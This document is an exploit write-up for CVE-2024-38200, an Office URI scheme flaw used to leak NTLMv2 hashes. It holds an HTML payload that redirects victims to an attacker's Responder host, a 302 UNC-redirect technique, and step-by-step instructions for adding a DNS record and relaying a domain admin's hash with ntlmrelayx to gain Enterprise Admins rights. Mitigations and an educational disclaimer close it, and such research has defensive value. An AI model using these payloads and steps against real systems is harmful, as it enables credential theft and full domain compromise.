# CVE-2024-38200
## Office URI Schemes
Previously, a method for capturing NTLMv2 hashes over SMB using the Office URI Schemes was shared.  The main idea was simple. Send the URL of below HTML file to victim and capture NTLMv2 hash over SMB. [LINK](https://www.securify.nl/blog/living-off-the-land-stealing-netntlm-hashes/) <br>
```
<!DOCTYPE html>
<html>
	<script>
		location.href = 'ms-word:ofe|u|\\<responder ip>\leak\leak.docx';
	</script>
</html>
```

 This is the inspiring point for me. If we look [Office URI Schemes](https://learn.microsoft.com/en-us/office/client-developer/office-uri-schemes) page, we can see that usage of `https://` protocol within URI scheme. This situation indicates that `http://` can also potentially be used. Capturing the NTLMv2 hash over HTTP is more advantageous than capturing it over SMB for performing NTLM Relaying attack against a Domain Controller server [Relaying Chart](https://www.thehacker.recipes/a-d/movement/ntlm/relay). <br>
When I used `ms-word:ofe|u|http://test.local:8080/leak/leak.docx` URI against the `Office 2016 MSO (16.0.4266.1001) 32-bit` , a warning box appeared to protect user from malicious activity but I can not say same for `Microsoft 365 Office and Office 2019`. These versions access a remote Office file without a warning and can be exploited to capture NTLMv2 hash over SMB and HTTP protocols.

![warningbox](https://github.com/user-attachments/assets/04d49a16-3899-45b7-bcc0-6dd7802c7be9)


## Vulnerability Details
We can redirect an HTTP request to a UNC path with 302 redirection when an Office application makes a request via Office URI schemes `(e.g., ms-word:ofe|u|http://172.20.10.8:8080/leak.docx)` . The `uncredirect.py` script handles the HTTP request which is sent with a MS Office URI schema and redirect it to a UNC path which includes IP address of `Responder`. This situation would make it possible to capture the NTLMv2 hash over SMB and bypass the security restriction for `ms-word:ofe|u|\\<responder ip>\leak\leak.docx` URI.


![officeuriwithunc](https://github.com/user-attachments/assets/7afce34b-6f64-469e-b7dc-31f3b17a9166)


## Proof Of Concept
1. Fire up `uncredirect.py` and `responder`.
2. Send the URL of the `office.html` file to the victim user.

https://github.com/user-attachments/assets/1481537e-d8a1-40b0-86a2-a367ffc16d67

# Capturing the NTLMv2 hash over HTTP
Capturing the NTLMv2 hash over HTTP is more advantageous than over SMB for relaying LDAP. When a file is requested via an Office URI, the NTLMv2 hash can be obtained over HTTP without redirecting to a UNC path using a 302 redirect. This exploitation method cannot be performed over the Internet because, unless there is a misconfiguration in Internet Properties, NTLM authentication will not occur over HTTP for a host outside the corporate network. <br>
However, I believe this is an effective method for relaying attack and escalating privileges.

## Misconfiguration with GPO in Internet Properties
The "Internet Properties" settings affect NTLM authentication behavior of Office applications. We can see this with a few examples. Let's assume we are using the `ms-excel:ofe|u|http://192.168.1.7/leak.xlsx` URI format to capture NTLMv2 hash. <br>
When one of the GPOs listed below is applied to a victim machine which is domain-joined, the Office application performs the authentication automatically.

1. `Automatic logon with current user name and password` is set for `User Authentication` in `Internet Zone`
2. A subnet or IP address range is added to sites of `Local Intranet` `(e.g., 192.168.*.* , 192.168.0-255.* , 192.168.1.7)`
3. A subnet or IP address range is added to `Trusted sites` `(e.g., 192.168.*.* , 192.168.0-255.* , 192.168.1.7)` and `Automatic logon with current user name and password` is set for `User Authentication` in `Trusted Sites` zone


![userlogonoptions](https://github.com/user-attachments/assets/d77b93ef-5c79-4f42-9f5c-30b6776c5766)

In the case where one of the GPOs mentioned above is applied, after the victim user clicks on the URI, the `leak.docx` file will be fetched by the Office application from the attacker's server and the NTLMv2 hash will be obtained because the applied GPO causes NTLM authentication to occur automatically. 


![ntlmauth](https://github.com/user-attachments/assets/ec0a81b9-9e17-4c6d-8a46-07b2c6d1e15d)

Example Scenario for Abusing the GPO: <br>
After setting the Office URI with the IP address `(e.g., ms-excel:ofe|u|http://192.168.1.7/leak.xlsx)`, we can send the URL of the `office.html` to a user with domain admin privileges and relay the captured hash to the LDAP(S) server using the `ntlmrelayx`. The `ntlmrelayx` will create a new user and add it to Enterprise Admins group with just clicking "Open" button.

Note: <br>
The sites added via GPO can be listed using the following registry keys.
```
Get-ItemProperty "hkcu:\Software\policies\microsoft\windows\currentversion\internet settings\ZoneMapKey"
Get-ItemProperty "hklm:\Software\policies\microsoft\windows\currentversion\internet settings\ZoneMapKey"
```
```
0: Internet | 1: Local Intranet | 2: Trusted Sites | 3: Restricted Sites
```

## Proof Of Concept
If one of the GPOs mentioned above is not applied, NTLM authentication will not occur automatically. However, if we add a DNS A record and use this record within the Office URI, Windows will consider the hostname as part of the Intranet Zone. In this way, NTLMv2 authentication occurs automatically and a standard user can escalate privileges without needing a misconfigured GPO. Any domain user with standard privileges can add a non-existent DNS record **`so this attack works with default settings for a domain user`**. 

1. Add a DNS record to resolve hostname to attacker IP address which runs ntlmrelayx. It takes approximately 5 minutes for the created record to start resolving.
    

![3](https://github.com/user-attachments/assets/80b99268-8d57-4ccb-aaa9-6df84f2dac86)


2. The `office.html` file can be served from any server accessible to the victim user `(e.g., https://office.com/office.html)` . I set port 8081 for Apache because ntlmrelayx will use port 80 by default. We can use `--http-port` with ntlmrelayx as another option. Enter the added record into the Office URI within the `office.html` file. 

![0](https://github.com/user-attachments/assets/b4a23489-bd70-4320-8351-a519097fc712)
![2-1](https://github.com/user-attachments/assets/e2ee2715-ace4-4fa0-912a-c78bffb2c88e)

3. Fire up ntlmrelayx: `python3 ntlmrelayx.py -t ldap://DC-IP-ADDRESS --escalate-user username`
4. Send the URL of the `office.html` file to a user with domain admin privileges. You should check whether the DNS record is resolved with the `ping` command before sending the URL.
5. When the victim user navigates to the URL, clicking the 'Open' button is enough to capture the NTLMv2 hash. (no warning!)
![6](https://github.com/user-attachments/assets/4684884f-7aa0-47ff-a715-d71114331cf1)

6. The captured NTLMv2 hash over HTTP is relayed to Domain Controller with `ntlmrelayx`. As a result, a standard user can obtain `DCSync` and `Enterprise Admins` permissions under the default configurations with just two clicks.
![8](https://github.com/user-attachments/assets/785c158d-d355-4977-a671-c9a12fc83231)


https://github.com/user-attachments/assets/6fdbcd57-16aa-4497-810e-18e0a251e890

https://github.com/user-attachments/assets/22b759f5-1ac2-45bd-8916-714c8a84b40f



If a domain-joined server is compromised and running `inveigh` or `ntlmrelayx` is possible, adding a DNS record is not necessary. <br>
Ntlmrelayx: `python3 ntlmrelayx.py -t ldaps://DC-IP-ADDRESS --http-port 8080` <br>
Office Uri: `ms-excel:ofe|u|http://compromisedservername:8080/leak.xlsx`

This proof of concept was carried out on `Microsoft Office 2019 MSO Build 1808 (16.0.10411.20011)` and `Microsoft 365 MSO (Version 2403 Build 16.0.17425.20176)` .


## Integrated Windows Authentication
> Anyone that has used Windows in an intranet corporate environment may have noticed that accessing corporate resources in a network is frictionless and, in many cases, requires no explicit authentication prompting for credentials other than the initial Windows domain log-on. This is true for several services, like network-mapped drives, intranet websites, and more.
> Microsoft-based browsers Internet Explorer and Edge have a concept of trusted zones: Internet, Local Intranet, Trusted Sites, and Restricted Sites. Each zone has a different security level and associated restrictions. For example, for Intranet zone sites, Internet Explorer disables the XSS filter, runs ActiveX plug-ins, performs automatic logins, and overall has fewer security controls than for Internet sites.
> By default, when a web server has a resource protected by NTLM authentication, Internet Explorer and Edge will perform the authentication automatically if the website is either located within the corporate intranet or is whitelisted in the Trusted Sites, respecting the concept of trusted zones.
> Other browsers, like Mozilla Firefox and Google Chrome, also support automatic NTLM log-on. Chrome relies on the same settings as Internet Explorer; in the case of Firefox, this configuration is not enabled by default and has to be manually changed via about:config.

https://www.blazeinfosec.com/post/web-app-vulnerabilities-ntlm-hashes/ 

> In order for a remote host to authenticate to you, for example as a result of following a UNC path, there are certain conditions that must be met. Predominantly, to minimise the likelihood of leaking hashes to external networks like the Internet, your system must fall within the “local intranet” zone. The easiest way to satisfy this requirement when you already have a foothold on the target’s internal network is to use your system’s NetBIOS name. That is, if you’re on workstation1.contoso.com, you should use workstation1 in your UNC path to force it in to the local intranet zone.

https://www.mdsec.co.uk/2021/02/farming-for-red-teams-harvesting-netntlm/


As mentioned, changes in Internet Properties also affect the NTLM authentication behavior of Edge and Chrome browsers. These browsers support automatic NTLM authentication and Windows assumes that an HTTP connection with NetBIOS name within the intranet zone and performs NTLM authentication. I later realized that, as indicated in the PoC, if a DNS record is created and a URL with NetBIOS name `(e.g., http://kali14/notexist.html )` is sent to a user, it is possible to capture and relay the NTLMv2 hash of the user if the URL is navigated in Edge or Chrome browsers. If we relay the NTLMv2 hash of privileged user to LDAP(s) with `ntlmrelayx` , we can escalate privileges in domain with default settings. 


![browserbehaviour](https://github.com/user-attachments/assets/d2cc6af5-e0ee-4cb3-a38f-d9207315b1e6)


# Mitigations
* Update Office applications: https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-38200
* Unselect `Include all local (intranet) sites not listed in other zones` option in settings of Local intranet sites in order to block automatic NTLM auth over HTTP. The option in question is selected by default. <br>

![sitesettings](https://github.com/user-attachments/assets/4382c799-e54e-44e7-a818-1f127ee3833f)

* Enable LDAP channel binding and LDAP signing

Note: This exploit is provided solely for educational and research purposes. The author is not responsible for any misuse or damages caused by the application of this exploit. Unauthorized use of this code in environments where you do not have explicit permission is illegal and unethical.
